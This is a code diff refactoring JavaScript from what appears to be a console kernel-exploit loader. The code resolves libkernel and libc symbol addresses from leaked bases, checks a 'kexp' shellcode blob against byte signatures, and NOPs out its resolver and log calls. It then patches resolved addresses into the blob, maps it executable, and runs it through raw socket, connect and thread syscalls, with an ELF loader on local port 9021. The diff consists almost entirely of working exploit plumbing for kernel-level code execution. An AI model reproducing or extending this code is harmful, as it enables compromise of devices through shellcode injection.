@@ -74,25 +74,16 @@ function resolveSymbols(p) {
   const bases = { libkernel: p.libKernelBase, libc: p.libSceLibcInternalBase };
   const resolved = {};
 
-  const groups = Object.keys(SHELLCODE.imports);
-  for (let g = 0; g < groups.length; g++) {
-    const group = groups[g];
+  for (const [group, imports] of Object.entries(SHELLCODE.imports)) {
     const base = bases[group];
     const offsets = tables[group];
     if (!base || (base.low === 0 && base.hi === 0))
       throw new Error("kexp: " + group + " base is unresolved");
     if (!offsets) throw new Error("kexp: " + group + " symbols are missing");
 
-    const imports = SHELLCODE.imports[group];
     const names = Object.keys(imports);
     if (group === "libkernel") names.push("getpid");
-    
-    const missing = [];
-    for (let i = 0; i < names.length; i++) {
-      if (typeof offsets[names[i]] !== "number") {
-        missing.push(names[i]);
-      }
-    }
+    const missing = names.filter((name) => typeof offsets[name] !== "number");
     if (missing.length)
       throw new Error("kexp: " + group + " is missing " + missing.join(", "));
     resolved[group] = { base, offsets };
@@ -134,20 +125,6 @@ async function connectToElfldr(p, chain) {
   p.write4(address, 0x3d230210); // AF_INET, port 9021
   p.write4(address.add32(4), 0x0100007f); // 127.0.0.1
 
-  for (let attempt = 0; attempt < 80; attempt++) {
-    const socket = await chain.syscall(SYS_SOCKET, 2, 1, 0);
-    const fd = socket.low | 0;
-    if (fd >= 0) {
-
-      const connected = await chain.syscall(SYS_CONNECT, fd, address, 16);
-      if ((connected.low >>> 0) === 0) return fd;
-      await chain.syscall(SYS_CLOSE, fd);
-    }
-    await new Promise((resolve) => setTimeout(resolve, 150));
-  }
-
-  throw new Error("elfldr is not listening on port 9021");
-}
   for (let attempt = 0; attempt < 40; attempt++) {
     const socket = await chain.syscall(SYS_SOCKET, 2, 1, 0);
     const fd = socket.low | 0;
@@ -187,37 +164,20 @@ export async function loadOptionalPayloads(p, chain, log) {
 function patchShellcode(blob, symbols) {
   if (blob.length !== SHELLCODE.size)
     throw new Error("kexp: expected " + SHELLCODE.size + " bytes, got " + blob.length);
-  
-  // تعديل آمن للـ resolverCalls والـ signatures بدون استخدام Destructuring داخل الـ Arrays
-  for (let i = 0; i < SHELLCODE.resolverCalls.length; i++) {
-    const item = SHELLCODE.resolverCalls[i];
-    if (!matches(blob, item[0], item[1])) {
-      throw new Error("kexp: shellcode signature does not match");
-    }
-  }
-  if (!matches(blob, SHELLCODE.getpid.at, SHELLCODE.getpid.bytes))
+  if (SHELLCODE.resolverCalls.some(([offset, bytes]) => !matches(blob, offset, bytes)) ||
+      !matches(blob, SHELLCODE.getpid.at, SHELLCODE.getpid.bytes))
     throw new Error("kexp: shellcode signature does not match");
 
-  for (let i = 0; i < SHELLCODE.resolverCalls.length; i++) {
-    const offset = SHELLCODE.resolverCalls[i][0];
-    for (let j = 0; j < 5; j++) blob[offset + j] = 0x90;
-  }
+  for (const [offset] of SHELLCODE.resolverCalls)
+    for (let i = 0; i < 5; i++) blob[offset + i] = 0x90;
 
   const addressOf = (group, name) => {
-    const symGroup = symbols[group];
-    return (BigInt(symGroup.base.hi) << 32n) + BigInt(symGroup.base.low >>> 0) + BigInt(symGroup.offsets[name]);
+    const { base, offsets } = symbols[group];
+    return (BigInt(base.hi) << 32n) + BigInt(base.low >>> 0) + BigInt(offsets[name]);
   };
-
-  const groups = Object.keys(SHELLCODE.imports);
-  for (let g = 0; g < groups.length; g++) {
-    const group = groups[g];
-    const imports = SHELLCODE.imports[group];
-    const keys = Object.keys(imports);
-    for (let k = 0; k < keys.length; k++) {
-      const name = keys[k];
-      writeU64(blob, imports[name], addressOf(group, name));
-    }
-  }
+  for (const [group, imports] of Object.entries(SHELLCODE.imports))
+    for (const [name, offset] of Object.entries(imports))
+      writeU64(blob, offset, addressOf(group, name));
 
   const { at, tail, tailAt, padFrom, padTo } = SHELLCODE.getpid;
   blob[at] = 0x48;
@@ -226,11 +186,9 @@ function patchShellcode(blob, symbols) {
   tail.forEach((byte, index) => blob[tailAt + index] = byte);
   for (let i = padFrom; i < padTo; i++) blob[i] = 0x90;
 
-  for (let i = 0; i < SHELLCODE.logCalls.length; i++) {
-    const offset = SHELLCODE.logCalls[i];
+  for (const offset of SHELLCODE.logCalls)
     if (blob[offset] === 0xe8)
-      for (let j = 0; j < 5; j++) blob[offset + j] = 0x90;
-  }
+      for (let i = 0; i < 5; i++) blob[offset + i] = 0x90;
 }
 
 async function mapExecutable(blob, p, chain) {
@@ -303,9 +261,7 @@ async function prepareShellcodePipes(krw, master, victim) {
 }
 
 async function spawnAndJoin(entry, args, symbols, p, chain) {
-  const libKernelSyms = symbols.libkernel;
-  const base = libKernelSyms.base;
-  const offsets = libKernelSyms.offsets;
+  const { base, offsets } = symbols.libkernel;
   const create = offsets.pthread_create_name_np === undefined
     ? offsets.pthread_create
     : offsets.pthread_create_name_np;
